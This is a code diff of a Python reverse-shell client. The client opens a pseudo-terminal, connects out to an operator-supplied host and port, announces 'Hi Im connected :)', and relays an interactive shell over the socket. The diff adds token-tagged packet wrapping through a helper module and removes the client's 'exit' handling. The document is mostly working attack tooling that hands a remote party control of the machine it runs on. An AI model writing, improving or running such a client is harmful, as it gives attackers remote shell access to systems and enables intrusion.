@@ -7,9 +7,13 @@ import socket
 import time
 import pty
 import os
+import json
+import random
+from pkt_common import get_payload, gen_pkt
 
 g_is_exit = 0
 
+g_tk=str(random.randrange(100000,999999,1))
 
 def remote_data_to_local(client, master_fd):
     global g_is_exit
@@ -20,17 +24,13 @@ def remote_data_to_local(client, master_fd):
 
         reta = select.select([client.fileno()], [], [client.fileno()], 0.5)
         if reta[0]:
-            output = os.read(client.fileno(), 1024)
-            command = output
+            output = os.read(client.fileno(), 8192)
+            command = get_payload(output,g_tk)
+
             if len(command) == 0:
                 continue
 
-            os.write(master_fd, command)
-            if command.strip() == b'exit':
-                os.write(master_fd, b'\n')
-                client.close()
-                print('exit:remote_data_to_local-2')
-                sys.exit(0)
+            os.write(master_fd, command.encode('utf-8'))
         elif reta[2]:
             # exception?
             print('exit:remote_data_to_local-3')
@@ -47,7 +47,8 @@ def local_data_to_remote(proc, master_fd, client):
                 sys.stdout.flush()
 
                 if len(output) > 0:
-                    client.send(output)  # .decode('utf-8')
+                    cmd = gen_pkt(output.decode('utf-8'),g_tk)
+                    client.send(cmd)  # .decode('utf-8')
     except Exception as e:
         print(e)
 
@@ -78,18 +79,12 @@ def client_one(remote_host, remote_port):
                             )
 
     tty_name = os.ttyname(slave_fd)
-    client.send(('Hi Im connected :)' + tty_name + '\n').encode('utf-8'))
+    client.send( gen_pkt('Hi Im connected :)' + tty_name + '\n', g_tk))
 
     t = threading.Thread(target=remote_data_to_local, args=(client, master_fd))
     t.start()
-    # pid = os.fork()
-    # if pid:
-    # child process. do read load, sendto remove
-    # os.close(slave_fd)
+
     local_data_to_remote(proc, master_fd, client)
-    # else:
-    #    # main process. do write to local.
-    #    remote_data_to_local(client,master_fd)
 
     print('exit:client_one')
     client.close()
@@ -102,5 +97,6 @@ if __name__ == "__main__":
         sys.exit(0)
     remote_host = sys.argv[1]
     remote_port = int(sys.argv[2])
-
+    if len(sys.argv)>3:
+        g_tk = str(sys.argv[3])
     client_one(remote_host, remote_port)
